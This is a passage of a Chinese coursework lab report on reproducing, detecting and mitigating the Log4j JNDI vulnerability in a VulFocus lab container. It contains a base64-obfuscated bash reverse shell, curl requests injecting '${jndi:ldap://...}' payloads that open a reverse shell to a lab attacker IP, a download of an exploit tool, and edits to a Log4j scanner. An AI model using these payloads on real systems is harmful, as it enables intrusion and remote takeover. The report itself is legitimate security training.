# 网安实践：上半场总流程

## 实验分工
### log4j部分
![](img/start1.png)
### dmz部分
![](img/start2.png)

## log4j实验部分

# 网络空间安全实验报告

<!-- TOC -->

- [网络空间安全实验报告](#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A)
    - [PART1 log4j 部分实践达成指标](#part1-log4j-%E9%83%A8%E5%88%86%E5%AE%9E%E8%B7%B5%E8%BE%BE%E6%88%90%E6%8C%87%E6%A0%87)
    - [PART2 实验环境](#part2-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83)
    - [PART3 实验内容](#part3-%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9)
        - [一. 环境搭建](#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)
            - [克隆仓库](#%E5%85%8B%E9%9A%86%E4%BB%93%E5%BA%93)
            - [添加 Docker APT 源并安装 Docker](#%E6%B7%BB%E5%8A%A0-docker-apt-%E6%BA%90%E5%B9%B6%E5%AE%89%E8%A3%85-docker)
            - [Docker 配置](#docker-%E9%85%8D%E7%BD%AE)
            - [VulFocus 环境搭建与运行](#vulfocus-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E8%BF%90%E8%A1%8C)
            - [进入容器并操作文件](#%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E5%B9%B6%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6)
            - [定位漏洞代码](#%E5%AE%9A%E4%BD%8D%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81)
        - [二. 漏洞存在性验证与利用](#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E6%80%A7%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8)
            - [[1] 漏洞存在检测](#1-%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E6%A3%80%E6%B5%8B)
            - [[2] 自动化exploit脚本编写](#2-%E8%87%AA%E5%8A%A8%E5%8C%96exploit%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99)
            - [[3] 评估log4j漏洞效果](#3-%E8%AF%84%E4%BC%B0log4j%E6%BC%8F%E6%B4%9E%E6%95%88%E6%9E%9C)
            - [[4] 构造攻击请求](#4-%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BB%E8%AF%B7%E6%B1%82)
        - [三. 漏洞利用检测](#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B)
            - [[方法一] 使用域名服务器](#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%BD%BF%E7%94%A8%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8)
            - [[方法二] 使用抓包工具](#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BD%BF%E7%94%A8%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7)
            - [[方法三] 使用interact.sh自动化检测](#%E6%96%B9%E6%B3%95%E4%B8%89-%E4%BD%BF%E7%94%A8interactsh%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B)
            - [[方法四] 使用 Suricata 自动化检测](#%E6%96%B9%E6%B3%95%E5%9B%9B-%E4%BD%BF%E7%94%A8-suricata-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B)
        - [四. 漏洞防御的思考](#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E7%9A%84%E6%80%9D%E8%80%83)
            - [📌 Log4j JNDI 攻击原理](#-log4j-jndi-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86)
            - [🛡️ Log4j JNDI 攻击的五种防御措施](#-log4j-jndi-%E6%94%BB%E5%87%BB%E7%9A%84%E4%BA%94%E7%A7%8D%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD)
                - [️⃣ 使用 Web 应用防火墙（WAF）拦截](#%EF%B8%8F%E2%83%A3-%E4%BD%BF%E7%94%A8-web-%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99waf%E6%8B%A6%E6%88%AA)
                - [️⃣ 禁用 JNDI 查找](#%EF%B8%8F%E2%83%A3-%E7%A6%81%E7%94%A8-jndi-%E6%9F%A5%E6%89%BE)
                - [️⃣ 立即修复 Log4j](#%EF%B8%8F%E2%83%A3-%E7%AB%8B%E5%8D%B3%E4%BF%AE%E5%A4%8D-log4j)
                - [️⃣ 禁用远程代码库](#%EF%B8%8F%E2%83%A3-%E7%A6%81%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%BA%93)
                - [️⃣ 禁用 Java 反序列化](#%EF%B8%8F%E2%83%A3-%E7%A6%81%E7%94%A8-java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
            - [📌 结论](#-%E7%BB%93%E8%AE%BA)
        - [五. 漏洞缓解](#%E4%BA%94-%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3)
            - [第一种方法: 打造Web应用防火墙（WAF）来缓解Log4j漏洞](#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95-%E6%89%93%E9%80%A0web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99waf%E6%9D%A5%E7%BC%93%E8%A7%A3log4j%E6%BC%8F%E6%B4%9E)
                - [[1] 实验目标](#1-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87)
                - [[2] 实验具体流程](#2-%E5%AE%9E%E9%AA%8C%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B)
                - [[3] 使用OWASP核心规则集（CRS）](#3-%E4%BD%BF%E7%94%A8owasp%E6%A0%B8%E5%BF%83%E8%A7%84%E5%88%99%E9%9B%86crs)
                - [[4] 自定义Log4j漏洞规则配置](#4-%E8%87%AA%E5%AE%9A%E4%B9%89log4j%E6%BC%8F%E6%B4%9E%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE)
                - [[5] 监控和日志分析](#5-%E7%9B%91%E6%8E%A7%E5%92%8C%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90)
                - [[6] 配置 Apache 监听 81 端口](#6-%E9%85%8D%E7%BD%AE-apache-%E7%9B%91%E5%90%AC-81-%E7%AB%AF%E5%8F%A3)
                - [[7] 配置反向代理](#7-%E9%85%8D%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86)
                - [[8] 测试 WAF 是否拦截恶意请求](#8-%E6%B5%8B%E8%AF%95-waf-%E6%98%AF%E5%90%A6%E6%8B%A6%E6%88%AA%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82)
                - [[9] 现在的情况以及存在的问题](#9-%E7%8E%B0%E5%9C%A8%E7%9A%84%E6%83%85%E5%86%B5%E4%BB%A5%E5%8F%8A%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98)
                - [[10] 改进](#10-%E6%94%B9%E8%BF%9B)
                - [[11] 总结一下当前进度](#11-%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E5%BD%93%E5%89%8D%E8%BF%9B%E5%BA%A6)
                - [[12] 出现新问题](#12-%E5%87%BA%E7%8E%B0%E6%96%B0%E9%97%AE%E9%A2%98)
                - [[13] 测试 WAF 拦截](#13-%E6%B5%8B%E8%AF%95-waf-%E6%8B%A6%E6%88%AA)
                - [[14] 最终总结](#14-%E6%9C%80%E7%BB%88%E6%80%BB%E7%BB%93)
                - [[15] 恢复默认配置,便于进行后续实验](#15-%E6%81%A2%E5%A4%8D%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E4%BE%BF%E4%BA%8E%E8%BF%9B%E8%A1%8C%E5%90%8E%E7%BB%AD%E5%AE%9E%E9%AA%8C)
                - [[16] 第一种方法总结](#16-%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93)
            - [第二种方法: 禁用 lookup 服务](#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95-%E7%A6%81%E7%94%A8-lookup-%E6%9C%8D%E5%8A%A1)
                - [构建 Docker 镜像](#%E6%9E%84%E5%BB%BA-docker-%E9%95%9C%E5%83%8F)
                - [运行 Docker 容器](#%E8%BF%90%E8%A1%8C-docker-%E5%AE%B9%E5%99%A8)
                - [验证容器运行状态](#%E9%AA%8C%E8%AF%81%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81)
                - [访问应用](#%E8%AE%BF%E9%97%AE%E5%BA%94%E7%94%A8)
                - [测试 Log4j 漏洞防护效果](#%E6%B5%8B%E8%AF%95-log4j-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C)
            - [第三种方法: 通过JVM参数禁用JNDI查找](#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95-%E9%80%9A%E8%BF%87jvm%E5%8F%82%E6%95%B0%E7%A6%81%E7%94%A8jndi%E6%9F%A5%E6%89%BE)
                - [分析当前环境](#%E5%88%86%E6%9E%90%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83)
                - [临时缓解措施 - 通过JVM参数禁用JNDI查找](#%E4%B8%B4%E6%97%B6%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD---%E9%80%9A%E8%BF%87jvm%E5%8F%82%E6%95%B0%E7%A6%81%E7%94%A8jndi%E6%9F%A5%E6%89%BE)
        - [六. 漏洞修复](#%E5%85%AD-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D)
            - [第一次尝试（失败）](#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%A4%B1%E8%B4%A5)
                - [进入容器执行修复操作](#%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E4%BF%AE%E5%A4%8D%E6%93%8D%E4%BD%9C)
                - [创建工作目录并准备环境](#%E5%88%9B%E5%BB%BA%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95%E5%B9%B6%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83)
                - [修改 log4j-core 库以移除 JndiLookup 类](#%E4%BF%AE%E6%94%B9-log4j-core-%E5%BA%93%E4%BB%A5%E7%A7%BB%E9%99%A4-jndilookup-%E7%B1%BB)
                - [重新打包修复后的应用 JAR](#%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E5%BA%94%E7%94%A8-jar)
                - [退出容器并重启应用使修复生效](#%E9%80%80%E5%87%BA%E5%AE%B9%E5%99%A8%E5%B9%B6%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8%E4%BD%BF%E4%BF%AE%E5%A4%8D%E7%94%9F%E6%95%88)
            - [错误分析](#%E9%94%99%E8%AF%AF%E5%88%86%E6%9E%90)
                    - [从日志中可以看出，应用最初成功启动了（Spring Boot banner和初始化消息正常），但在重启时出现了严重错误：](#%E4%BB%8E%E6%97%A5%E5%BF%97%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E5%BA%94%E7%94%A8%E6%9C%80%E5%88%9D%E6%88%90%E5%8A%9F%E5%90%AF%E5%8A%A8%E4%BA%86spring-boot-banner%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B6%88%E6%81%AF%E6%AD%A3%E5%B8%B8%E4%BD%86%E5%9C%A8%E9%87%8D%E5%90%AF%E6%97%B6%E5%87%BA%E7%8E%B0%E4%BA%86%E4%B8%A5%E9%87%8D%E9%94%99%E8%AF%AF)
                    - [根本原因](#%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0)
                    - [重要的命令分析](#%E9%87%8D%E8%A6%81%E7%9A%84%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90)
                    - [解决方案](#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88)
            - [第二次尝试（失败）](#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%A4%B1%E8%B4%A5)
                - [修复 Log4j 漏洞 - 正确重新打包 JAR 文件](#%E4%BF%AE%E5%A4%8D-log4j-%E6%BC%8F%E6%B4%9E---%E6%AD%A3%E7%A1%AE%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85-jar-%E6%96%87%E4%BB%B6)
                - [进入容器并准备环境](#%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E5%B9%B6%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83)
                - [创建工作目录](#%E5%88%9B%E5%BB%BA%E5%B7%A5%E4%BD%9C%E7%9B%AE%E5%BD%95)
                - [定位并修复 log4j-core 库](#%E5%AE%9A%E4%BD%8D%E5%B9%B6%E4%BF%AE%E5%A4%8D-log4j-core-%E5%BA%93)
                - [使用适当方法修改 Spring Boot JAR](#%E4%BD%BF%E7%94%A8%E9%80%82%E5%BD%93%E6%96%B9%E6%B3%95%E4%BF%AE%E6%94%B9-spring-boot-jar)
                - [退出容器并重启应用](#%E9%80%80%E5%87%BA%E5%AE%B9%E5%99%A8%E5%B9%B6%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8)
            - [第三次尝试（成功）](#%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%B0%9D%E8%AF%95%E6%88%90%E5%8A%9F)
            - [验证Log4j漏洞修复](#%E9%AA%8C%E8%AF%81log4j%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D)
                - [设置验证环境](#%E8%AE%BE%E7%BD%AE%E9%AA%8C%E8%AF%81%E7%8E%AF%E5%A2%83)
                - [测试漏洞](#%E6%B5%8B%E8%AF%95%E6%BC%8F%E6%B4%9E)
                - [如何验证：](#%E5%A6%82%E4%BD%95%E9%AA%8C%E8%AF%81)
                - [额外验证：](#%E9%A2%9D%E5%A4%96%E9%AA%8C%E8%AF%81)
                - [Log4j 漏洞修复验证分析](#log4j-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E9%AA%8C%E8%AF%81%E5%88%86%E6%9E%90)
                    - [日志分析结果](#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C)
                    - [关键发现](#%E5%85%B3%E9%94%AE%E5%8F%91%E7%8E%B0)
                    - [综合结论](#%E7%BB%BC%E5%90%88%E7%BB%93%E8%AE%BA)
    - [PART4 遇到的问题](#part4-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98)
        - [问题一 : 环境搭建问题](#%E9%97%AE%E9%A2%98%E4%B8%80--%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98)
            - [ARM64系统运行x86_64架构容器问题](#arm64%E7%B3%BB%E7%BB%9F%E8%BF%90%E8%A1%8Cx86_64%E6%9E%B6%E6%9E%84%E5%AE%B9%E5%99%A8%E9%97%AE%E9%A2%98)
        - [问题二 : 漏洞缓解阶段问题](#%E9%97%AE%E9%A2%98%E4%BA%8C--%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E9%98%B6%E6%AE%B5%E9%97%AE%E9%A2%98)
            - [JVM安全参数未正确应用](#jvm%E5%AE%89%E5%85%A8%E5%8F%82%E6%95%B0%E6%9C%AA%E6%AD%A3%E7%A1%AE%E5%BA%94%E7%94%A8)
        - [问题三 : 漏洞修复阶段问题](#%E9%97%AE%E9%A2%98%E4%B8%89--%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E9%98%B6%E6%AE%B5%E9%97%AE%E9%A2%98)
            - [第一次尝试修复失败](#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E4%BF%AE%E5%A4%8D%E5%A4%B1%E8%B4%A5)
            - [第二次尝试修复失败](#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95%E4%BF%AE%E5%A4%8D%E5%A4%B1%E8%B4%A5)
            - [第三次尝试成功](#%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%B0%9D%E8%AF%95%E6%88%90%E5%8A%9F)
            - [总结一下](#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B)
        - [问题四](#%E9%97%AE%E9%A2%98%E5%9B%9B)
            - [问题描述](#%E9%97%AE%E9%A2%98%E6%8F%8F%E8%BF%B0)
            - [解决方法](#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95)
                - [方法 1：使用单引号包裹参数](#%E6%96%B9%E6%B3%95-1%E4%BD%BF%E7%94%A8%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8C%85%E8%A3%B9%E5%8F%82%E6%95%B0)
                - [方法 2：使用双引号并转义 $](#%E6%96%B9%E6%B3%95-2%E4%BD%BF%E7%94%A8%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%B9%B6%E8%BD%AC%E4%B9%89-)
                - [方法 3：切换到 bash shell](#%E6%96%B9%E6%B3%95-3%E5%88%87%E6%8D%A2%E5%88%B0-bash-shell)

<!-- /TOC -->

---

## PART1 log4j 部分实践达成指标
- [x] vulfocus 环境搭建
- [x] log4j 漏洞复现环境搭建
- [x] log4j 漏洞利用复现
- [x] log4j 漏洞靶机上的缺陷代码已完成逆向分析，定位到了漏洞代码片段
- [x] log4j 漏洞缓解完成，并验证了缓解效果，但依然有绕过方法可以完成漏洞利用
- [x] log4j 漏洞修复完成，并验证了修复效果

---

## PART2 实验环境
* **系统环境** ：Kali Linux on ARM64(aarch64)
* **Docker版本** ：Docker
* **目标容器** ：vulfocus/vulfocus:latest (x86_64架构)
* **虚拟机**：Parallels Desktop20.0


---

## PART3 实验内容

### 一. 环境搭建
#### 1. 克隆仓库
```bash
git clone https://github.com/c4pr1c3/ctf-games.git
```
![1740997475247](/image/record/1740997475247.png)

#### 2. 添加 Docker APT 源并安装 Docker

```bash
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list
```
![1740997499362](image/record/1740997499362.png)
- 将 Docker 的 APT 源添加到系统的软件源列表中。
- deb 行指定了源的架构（arch=amd64）、签名文件的位置（signed-by=/etc/apt/keyrings/docker.gpg）以及源的 URL 和发行版名称（bookworm stable）。

```bash
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo apt update && sudo apt install docker-ce docker-ce-cli containerd.io jq
```
![1740997515207](image/record/1740997515207.png)
- 使用 curl 从 Docker 官方下载 GPG 公钥，并通过 gpg --dearmor 将其转换为适合 APT 使用的格式，最后保存为 /etc/apt/keyrings/docker.gpg。


#### 3. Docker 配置
1. **添加用户到 Docker 组 , 切换到 root 用户并进行操作:**
   ```bash
   sudo usermod -a -G docker kali
   sudo su -
   ```
   ![1740997536107](image/record/1740997536107.png)

2. **编辑 /etc/docker/daemon.json 文件，添加镜像加速器地址：**
   ![1740997552151](image/record/1740997552151.png)

#### 4. VulFocus 环境搭建与运行

1. **拉取 vulfocus/vulfocus:latest 镜像，并启动容器：**
   ![1740997564292](image/record/1740997564292.png)

2. **首先尝试使用 docker-compose 来管理容器**
![1740997600688](image/record/1740997600688.png)

3. **安装完成后，系统自动升级了一些依赖包，并移除了一些不再需要的包。**

4. **接下来，进入 /workspace/ctf-games/fofapro/vulfocus 目录，启动了 VulFocus 环境：**
   ```bash
   bash start.sh
   ```
   ![1740997623410](image/record/1740997623410.png)
   - 脚本会检查本地 IP 地址并设置环境变量，然后创建并启动 vulfocus_vulfocus_1 容器。通过 docker ps 查看容器状态，确认容器已成功启动并运行正常。

   **结果验证：**
   执行 `docker ps`命令可以看到容器成功运行并保持健康状态：

   ```
   CONTAINER ID   IMAGE                      COMMAND                  CREATED          STATUS                    PORTS                               NAMES
   f1dbefb28904   vulfocus/vulfocus:latest   "sh /vulfocus-api/ru…"   10 seconds ago   Up 10 seconds (healthy)   0.0.0.0:80->80/tcp, :::80->80/tcp   vulfocus_vul-focus_1

   ```

   打开登录页面 , 输入账号``admin``，密码``admin``
   ![1742138046570](image/网络安全丁梦/1742138046570.png)

   如下图路径，下载

   ![1742138235143](image/网络安全丁梦/1742138235143.png)

   修改镜像过期时间

   ![1742138487756](image/网络安全丁梦/1742138487756.png)

   下载好后可在首页看到

   ![1742138504203](image/网络安全丁梦/1742138504203.png)

   点击启动

   ![1742138526164](image/网络安全丁梦/1742138526164.png)

   访问地址 `10.37.133.3:56174`

   ![1742139977490](image/网络安全丁梦/1742139977490.png)


#### 5. 进入容器并操作文件
```bash
docker exec -it kind_engelbart bash
```
![1740997650327](image/record/1740997650327.png)

在容器内部，复制 demo.jar 到宿主机上。由于容器内没有安装 docker 命令，因此直接在容器内执行 docker cp 是不可行的。最终，我通过宿主机上的命令成功将文件复制出来：
```bash
docker cp kind_engelbart:/demo/demo.jar /home/kali/workspace/ctf-games/fofapro/vulfocus/
```
![1740997668813](image/record/1740997668813.png)

#### 6. 定位漏洞代码
![1742788551592](image/record/1742788551592.png)

---

### 二. 漏洞存在性验证与利用

#### [1] 漏洞存在检测

1. **确认容器状态**
   ```
   docker ps                         
   ```
   ![1742624567415](image/网络安全丁梦/1742624567415.png)
   确认log4j2-rce容器正在运行，端口映射为56334。

2. **从容器中提取JAR文件**
   ```
   # 进入容器
   docker exec -it recursing_proskuriakova bash

   # 复制JAR文件到本地
   docker cp recursing_proskuriakova:/demo/demo.jar ./
   ```
   ![1742624849646](image/网络安全丁梦/1742624849646.png)
   ![1742625735633](image/网络安全丁梦/1742625735633.png)

3. **环境准备**

   ```
   # 安装Java开发工具包
   sudo apt update
   sudo apt install default-jdk

   # 验证jar工具可用性
   jar --version
   ```

   ![1742625777372](image/网络安全丁梦/1742625777372.png)

4. **JAR文件分析**

   ```
   # 创建临时目录
   mkdir temp && cd temp

   # 解压 JAR 文件
   jar xf ../demo.jar

   # 查看 pom.xml 或 MANIFEST.MF 文件中的依赖信息
   cat META-INF/MANIFEST.MF

   # 查找 log4j 相关类文件
   find . -name "*.class" | grep -i log4j
   ```

   ![1742625939252](image/网络安全丁梦/1742625939252.png)

   检查MANIFEST.MF文件，确认关键信息：

   Implementation-Title: log4j2_rce
   Spring-Boot-Version: 2.1.3.RELEASE
   Start-Class: com.example.log4j2_rce.Log4j2RceApplication

   找到关键类文件： ./BOOT-INF/classes/com/example/log4j2_rce/Log4j2RceApplication.class

   初步结论，通过分析发现：

   应用使用log4j2框架
   包含log4j2_rce相关类
   为Spring Boot应用，版本2.1.3.RELEASE
   存在可疑的RCE（远程代码执行）相关类


#### [2] 自动化exploit脚本编写

![1742750573594](image/record/1742750573594.png)
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMzEvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}
```

#### [3] 评估log4j漏洞效果

**下载利用工具 :**
```bash
wget https://github.com/Mr-xn/JNDIExploit/release/download/v1.2/JNDIExploit.v1.2.zip
```
![1741599510999](image/record/1741599510999.png)

#### [4] 构造攻击请求

1. **原始 PPT 中的命令：**
```bash
curl http://192.168.20.6:35536/hello -d 'payload=${jndi:ldap://192.168.168.3:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.168.3/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}'
```

2. **修改后的命令（用于避免 Shell 解析问题）：**
```bash
curl -G --data-urlencode "payload=\${jndi:ldap://192.168.168.3:1389/TomcatBypass/Command/Base64/$(echo -n 'bash -i >& /dev/tcp/192.168.168.3/7777 0>&1' | base64 | tr -d '\n' | sed 's/+/%2B/g' | sed 's/=/%3D/g')}" http://192.168.20.6:35536/hello
```
![1741599405269](image/record/1741599405269.png)

3. **Payload 说明：**
- 使用 `${jndi:ldap://...}` 构造恶意 JNDI 字符串。
- 将反向 shell 命令 `bash -i >& /dev/tcp/192.168.168.3/7777 0>&1` 转换为 Base64 编码，以适配 URL 参数格式。
- 目标服务器执行该 payload 后，会尝试连接攻击者的 IP 地址 `192.168.168.3` 和端口 `7777`。

4. **实验结果：**
![1741599479868](image/record/1741599479868.png)
![1741599539331](image/record/1741599539331.png)
![1741599577815](image/record/1741599577815.png)
- 请求返回 “ok”，表示服务端已接收 payload。
- 成功建立反向 shell 连接，验证了 Log4j 漏洞可被成功利用。


---

### 三. 漏洞利用检测

#### [方法一] 使用域名服务器
1. **注册临时域名**
   - 使用 `http://log.fendou.us:8080/dns/` 网站注册了一个临时域名 `chloris.check4safe.top`。
   - 注册结果在网站上显示，确认域名已成功创建。
   ![1741158922380](image/record/1741158922380.png)

2. **使用域名服务器抓包并进行流量分析**
  - 使用 `curl` 命令模拟攻击请求，测试 Log4j 漏洞：
    ```bash
    curl -G --data-urlencode "payload=${jndi:ldap://chloris.check4safe.top}" http://192.168.20.6:44515/hello -vv
    ```
  - 通过 `-vv` 参数查看详细的请求和响应信息，确保请求被正确发送并返回预期的结果。
- **抓包结果**：
  - 日志显示请求包含恶意 payload `${jndi:ldap://chloris.check4safe.top}` 请求被成功发送到目标服务器，并且返回了 HTTP/1.1 200 OK 的响应。
  ![1741160078861](image/record/1741160078861.png)

3. **检测结果**
  - 在 `log.fendou.us` 网站的 DNSLog 页面中，可以看到注册的子域名 `chloris.check4safe.top` 的查询记录。

  - 记录显示该域名被解析为 IP 地址 `219.141.176.11`，位置在北京，时间为 `2025-03-05 15:33:23`，验证了 Log4j 漏洞的存在。
  ![1741160054827](image/record/1741160054827.png)

#### [方法二] 使用抓包工具
1. **漏洞利用**
先在受害者主机上抓包，然后使用 Wireshark 分析抓到的数据包。
用攻击者主机构造攻击指令
```bash
curl -G --data-urlencode "payload=${jndi:ldap://chloris.check4safe.top}" http://192.168.20.6:44515/hello -vv
```
![1741162286690](image/record/1741162286690.png)
抓包已经保存到 ``/home/kali/workspace/ctf-games/fofapro/vulfocus/capture.pcap``
![1741162087551](image/record/1741162087551.png)
可以看到 ``HTTP`` 请求包中包含恶意的 ``payload`` ，用于触发 ``Log4j 漏洞``
![1742188081878](image/record/1742188081878.png)

---

#### [方法三] 使用interact.sh自动化检测

- 由于 ``log4j-scan`` 默认使用 interact.sh 作为 DNS 回调服务来检测 Log4j 漏洞。但是由于目前服务不可用，我无法连接到 interact.sh，我选择 ceye.io 公共 DNS 回调服务
- 从 `log4j-scan.py` 代码来看，原本的工具默认支持两种 DNS 回调服务：`interact.sh` 和 `dnslog.cn`。想要实现支持 `ceye.io`，需要对代码进行一些修改。以下是具体的**修改步骤**：

**1. 添加 `Ceye` 类**
在代码中添加一个新的类 `Ceye`，用于处理 `ceye.io` 的 DNS 回调逻辑。找到 `Dnslog` 和 `Interactsh` 类的定义部分，在其后面添加以下代码：

```python
class Ceye:
    def __init__(self, token, domain):
        self.token = token
        self.domain = domain
        self.session = requests.Session()
        self.session.proxies = proxies

    def pull_logs(self):
        url = f"http://api.ceye.io/v1/records?token={self.token}&type=dns"
        response = self.session.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get("data", [])
        return []
```

**2. 修改 `main()` 函数**
在 `main()` 函数中，找到 DNS 回调服务初始化的部分（大约在第 411 行），修改为支持 `ceye.io`。将以下代码：

```python
if args.dns_callback_provider == "interact.sh":
    dns_callback = Interactsh()
elif args.dns_callback_provider == "dnslog.cn":
    dns_callback = Dnslog()
else:
    raise ValueError("Invalid DNS Callback provider")
```

修改为：

```python
if args.dns_callback_provider == "interact.sh":
    dns_callback = Interactsh()
elif args.dns_callback_provider == "dnslog.cn":
    dns_callback = Dnslog()
elif args.dns_callback_provider == "ceye.io":
    # 需要提供 ceye.io 的 token 和域名
    ceye_token = "your_ceye_token"  # 替换为 ceye.io token
    ceye_domain = "your_ceye_domain"  # 替换为 ceye.io 域名
    dns_callback = Ceye(ceye_token, ceye_domain)
else:
    raise ValueError("Invalid DNS Callback provider")
```

**3. 修改 `parser.add_argument` 部分**
在 `parser.add_argument` 部分，找到 `--dns-callback-provider` 的定义（大约在第 150 行），将其修改为：

```python
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider (Options: dnslog.cn, interact.sh, ceye.io) - [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
```

**4. 修改 `scan_url()` 函数**
在 `scan_url()` 函数中，确保生成的 payload 使用 `ceye.io` 的域名。找到以下代码：

```python
payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
```

确保 `callback_host` 是 `ceye.io` 的域名。

**修改后的代码 :**
```python
class Ceye:
    def __init__(self, token, domain):
        self.token = token
        self.domain = domain
        self.session = requests.Session()
        self.session.proxies = proxies

    def pull_logs(self):
        url = f"http://api.ceye.io/v1/records?token={self.token}&type=dns"
        response = self.session.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get("data", [])
        return []

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = args.custom_dns_callback_host
    else:
